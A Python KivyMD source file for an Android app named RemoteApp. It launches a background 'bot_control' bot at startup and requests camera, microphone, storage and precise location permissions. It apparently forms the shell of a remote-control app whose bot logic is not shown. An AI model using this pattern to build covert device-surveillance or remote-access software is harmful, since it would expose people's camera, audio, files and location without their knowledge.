from kivymd.app import MDApp
from kivy.uix.screenmanager import Screen
from kivy.utils import platform
import threading
import bot_control

class MainScreen(Screen):
    pass

class RemoteApp(MDApp):
    def build(self):
        # Jalankan bot di thread terpisah agar UI tidak hang
        threading.Thread(target=bot_control.start_bot, daemon=True).start()
        return MainScreen()

    def on_start(self):
        # Meminta izin akses storage saat aplikasi dibuka
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION
            ])

if __name__ == '__main__':
    RemoteApp().run()
